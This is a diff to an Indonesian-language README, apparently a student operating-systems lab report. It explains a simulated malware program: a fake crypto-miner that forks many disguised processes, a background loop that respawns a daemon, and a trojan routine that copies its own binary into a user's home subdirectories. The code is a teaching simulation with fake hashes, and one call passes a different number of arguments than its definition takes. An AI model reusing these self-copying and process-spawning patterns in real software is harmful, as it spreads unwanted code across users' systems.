@@ -482,6 +482,65 @@ void spread_trojan(const char *self_path) {
     closedir(dir);
 ```
 Fungsi `spread_trojan` menyalin file subdirektori dalam 1 user. Fungsi awalnya mendapat path direktori dari home user, kemudian membuka dan membaca entri didalamnya. Fungsi akan membuat salinan file yang sedang berjalan dengan nama copy_malware. Proses dilakukan awalnya membuka `self_path` kemudian membaca isinya di buffer, dan ditulis di `copy_malware`.
+```
+void generate_crypto_hash(char *hash){
+    const char *hex = "0123456789abcdef";
+    for(int i = 0; i < 64; i++){
+        hash[i] = hex[rand() % 16];
+    }
+    hash[64] = '\0';
+}
+```
+Fungsi `generate_crypto_hash` digunakan untuk membuat string acak sepanjang 64 karakter dengan parameter `char *hash` adalah pointer ke array karakter tempat hasil hash akan disimpan.`char *hex` menyimpan semua karakter heksadesimal yang akan digunakan sebagai karakter-karakter untuk menyusun hash. Loop `for(int i = 0; i < 64; i++` akan berjalan 64 kali untuk membuat hash sepanang 64 karakter. Output dari fungsi ini tidak mengembalikan nilai `void`, tapi hasilnya disimpan di `hash`.
+```
+void rodok_forkbomb() {
+    for(int i = 0; i < MAX_MINERS; i++) {
+        pid_t pid = fork();
+        if(pid < 0) {
+            perror("Failed to fork.");
+            continue;
+        }
+
+        if(pid == 0) {
+            char name[32];
+            snprintf(name, sizeof(name), "mine-crafter-%d", i);
+            if(prctl(PR_SET_NAME, name, 0, 0, 0) == -1) {
+                perror("Failed to set process name.");
+            }
+
+            while(1) {
+                char hash[65];
+                generate_crypto_hash(hash);
+                printf("[%s] Hash: %s\n", name, hash);
+                int wait_time = (rand() % 28) + 3;
+                sleep(wait_time);
+            }
+            exit(0);
+        }
+    }
+}
+```
+Fungsi `rodok_forkbomb()` membuat hingga `MAX_MINERS` proses anak menggunakan `fork()`. setiap proses anak akan mengatur nama proses menjadi unik, misal `mine-crafter-1`. Fungsi ini terus menerus membuat hash palsu menggunakan fungsi `generate_crypto_hash` sebelumnya dan menampilkan hash ke layar setiap 3-30 detik.
+```
+void loop_wannacryptor_trojan() {
+    pid_t pid = fork();
+    if(pid < 0) {
+        perror("Failed to fork.");
+        exit(EXIT_FAILURE);
+    }
+
+    if(pid == 0) {
+        while(1) {
+            spawn_daemon();
+            spread_trojan();
+            sleep(30);
+        }
+        exit(0);
+    }
+}
+```
+Fungsi ini akan menjalankan proses anak (child process) yang melakukan simulasi trojan dan ransomware berulang terus setiap 30 detik, selama malware masih aktif. Fungsi akan dijalankan sekali oleh program utama untuk meluncurkan proses latar. Membuat proses anak menggunakan `fork()`. Pid berisi `0 = jika di proses anak`, `>0 = jika diproses induk`, `<0 = kalau gagal`. Loop akan terus berjalan selama proses anak masih hidup. 
+
 ### Output saat ./malware di run
 ![image](https://github.com/user-attachments/assets/8c08fd90-45f3-47a4-9190-1d490a49a179)
 ### Output saat kita melihat isi ps aux dan mengecek file /init
